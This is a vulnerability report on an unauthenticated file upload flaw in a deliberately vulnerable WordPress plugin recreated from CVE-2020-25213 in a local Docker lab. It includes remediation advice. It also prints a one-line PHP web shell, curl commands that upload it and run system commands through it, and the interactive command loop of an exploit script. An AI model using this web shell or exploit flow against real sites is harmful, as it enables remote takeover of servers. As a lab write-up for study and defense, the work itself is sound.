
# Vulnerability Report : Arbitrary File Upload in Custom WordPress Plugin
**Target:** Custom WordPress Vulnerable Environment  
**Prepared by:** Jan Adrie M. Carandang  
**Date:** November 2025  

---

# Table of Contents
1. Summary  
2. Affected Component  
3. Severity  
4. CVSS Score  
5. Description  
6. Steps to Reproduce  
7. Proof of Concept  
8. Impact  
9. Remediation  
10. Appendix – Technical Steps & Execution Flow 
    
    10.1 Environment Preperation 
    
    10.2 Deploying Vulnerable Environment
    
    10.3 Automated Exploitation Using `script.py`
    
    10.4 Summary  
    

---

# 1. Summary
A critical arbitrary file upload vulnerability was identified in the custom WordPress plugin **wp-file-manager-unsafe**, a simplified and intentionally vulnerable recreation inspired by the real-world WordPress File Manager plugin vulnerability (CVE‑2020‑25213).  
The plugin exposes a PHP file upload form without validation, allowing an attacker to upload executable PHP code and achieve remote code execution (RCE).

---

# 2. Affected Component
**Component:** `/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php`  
**Vulnerable Functionality:** Unauthenticated file upload  
**Upload Destination:** `/wp-content/plugins/wp-file-manager-unsafe/uploads/`

---

# 3. Severity
This vulnerability allows unauthenticated remote code execution.  
It should be treated as Critical.

---

# 4. CVSS Score
As a reference to the original CVE‑2020‑25213, the following CVSS scores demonstrate the severity of this type of vulnerability:

| Scoring Authority | Base Score | Severity | CVSS Vector |
|------------------|-----------|----------|-------------|
| NIST (NVD)       | 9.8       | CRITICAL | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| MITRE            | 10.0      | CRITICAL | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |

These values are aligned with the exploitability of this recreated environment.

---

# 5. Description
The vulnerable plugin exposes a direct file upload form inside `Adrie-file-manager.php`.  
Key issues:

- No authentication required  
- No MIME-type validation  
- No file extension filtering  
- Uploaded files are saved directly into a web-accessible directory  
- WordPress and the underlying container allow execution of `.php` files in the uploads directory  

This enables uploading `payload.php`, a simple command-execution web shell.

---

# 6. Steps to Reproduce
Below are the required steps to exploit the vulnerability.

### 1. Access the vulnerable upload endpoint:
```
http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php
```

![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441737040638119997/FA5B3275-525E-4FE6-883B-2F171612EE5C.png?ex=6922e1c0&is=69219040&hm=a905e37fcb4b89c694c812d5482955db645bf775614b24eaf5cbbb351b2189b9)

### 2. upload `payload.php` using curl:
```
curl -X POST -F "file=@payload.php" \
  http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php
```

If successful, the file will appear inside:
```
/wp-content/plugins/wp-file-manager-unsafe/uploads/payload.php
```

![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441711269068673075/CB2DB554-6070-4046-BA6B-33F9EBC8D81F.png?ex=6922c9c0&is=69217840&hm=7ec14d8f3901e08fec53703bb79cbdb3b636e35309f58636d2928338dcaeb773)

### 3. Execute commands:
```
curl "http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/uploads/payload.php?cmd=id"
```

![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441717268294799483/07AC2DB6-28E4-43C5-98E7-85B211334ADF.png?ex=6922cf56&is=69217dd6&hm=a77f461a35481340ee6c8f2545b62f2542ee96aa8dc7d5523ecbc15c26a5a33f)

---

# 7. Proof of Concept
Example execution:

### Upload:
```
curl -X POST -F "file=@payload.php" \
  http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php
```

### Remote Code Execution:
```
curl "http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/uploads/payload.php?cmd=whoami"
```

Expected output:
```
www-data
```

![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441738580035637370/14160C4E-EDFC-43A6-A359-EBB2BCB53E19.png?ex=6922e32f&is=692191af&hm=decd7879e6f68415a39f2c7dcc5d93f35e73fddc7042779916b21f10e9656c08)

---

# 8. Impact
An attacker can:

- Execute arbitrary system commands  
- Fully compromise the container  
- Access and modify WordPress content  
- Upload additional malicious files  
- Escalate into lateral movements in connected environments  

This is full unauthenticated RCE.

---

# 9. Remediation
Recommended fixes:

- Restrict access to upload functionality  
- Enforce server-side extension validation  
- Disable PHP execution in uploads directory  
- Add nonce + authentication checks  
- Use WordPress native upload APIs  
- Implement folder permissions:
```
chown -R www-data:www-data /var/www/html/wp-content/plugins/wp-file-manager-unsafe
chmod -R 755 /var/www/html/wp-content/plugins/wp-file-manager-unsafe
```

---



## 10. Appendix – Technical Steps & Execution Flow

This appendix documents the exact technical actions required to reproduce the vulnerability, deploy the environment, execute the exploit, and validate remote code execution. Commands are presented as reproducible, copy‑paste‑ready references.

---

### 10.1 Environment Preparation

#### 1. Ensure the Docker daemon is running
`sudo systemctl start docker`

#### 2. Add the current user to the `docker` group
`sudo usermod -aG docker $USER`

#### 3. Apply new group membership
`newgrp docker`

---

### 10.2 Deploying the Vulnerable Environment

The project’s `run.sh` script automates deployment and preparation. It performs:

- Cleanup of previous containers  
- Startup of MySQL  
- DB restore (if `wordpress.sql` exists)  
- Startup of the vulnerable WordPress container  
- Plugin deployment  
- Permission fixing

#### Technical Explanation of `run.sh`

1. **Argument Parsing**  
   Supports commands such as `start`, `stop`, `clean`, `rebuild`.  
   Default: full environment deployment.

2. **Database Initialization**  
   Runs MySQL container first.  
   Restores `wordpress.sql` when available.

3. **WordPress Deployment**  
   Uses `docker-compose up -d`.  
   Ensures both DB and WordPress are online.

4. **Plugin Deployment**  
   Uses `docker cp` to move the vulnerable plugin into the container.

5. **Permission Fixing**  
   Ensures upload directory is writable for exploitation.

#### Run deployment:
`./run.sh`

Check containers:
`docker ps`

![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441752082683269222/9E9B72D8-AC58-46C1-867B-AF958936EB0C.png?ex=6922efc2&is=69219e42&hm=37c3cec7a91856151433e7002f2bf9fca64c0cc6b58ac2f871fb795979ac9388)

WordPress admin:
`http://localhost:9999/wp-admin`

![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441753258103148565/45E79B1C-BE27-46EA-A733-9089F6E995FD.png?ex=6922f0db&is=69219f5b&hm=307a550e7a1fb690015bd8b3829a0214404df2ef2dce8601e399561c300cb6aa)

---

### 10.3 Automated Exploitation Using `script.py`

`script.py` automates:

- Uploading `payload.php` (`<?php echo shell_exec($_GET['cmd']); ?>`)
- Resolving the uploaded shell path  
- Starting an RCE command loop

#### Technical Explanation of `script.py`

1. **Argument Parsing**
Accepts:
- `--url`
- `file` (payload filename)

2. **Upload Function**
Uses:
requests.post()
Target:
 /wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php

3. **Shell Path Resolution**
Calculates:
 /wp-content/plugins/wp-file-manager-unsafe/uploads/<filename>

4. **Interactive Shell Logic**
while True:
    cmd = input("cmd> ")
    r = requests.get(shell_url, params={"cmd": cmd})
    print(r.text)

5. **Error Handling**
Handles:
- timeouts  
- failed connections  
- missing payloads  

6. **Output Handling**
Prints command results and validates RCE.

#### Usage:
`python3 script.py payload.php --url http://localhost:9999`

![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441724358577094768/D2F120D9-22FC-4CED-9928-AC920FF8C907.png?ex=6922d5f1&is=69218471&hm=6b19388beb4b90ce9dc2260a96ab675b4fdab5fcc476dc2e3a028c5a44d749df)


---

### 10.4 Summary

This appendix provides the complete technical steps required to reproduce:

- Environment setup  
- Deployment via `run.sh`  
- Permission correction  
- Automated exploitation through `script.py`  
- Interactive RCE validation  

This serves as a full reproduction guide for assessment and review.

---


# Prepared by  
**Jan Adrie M. Carandang**  
November 2025

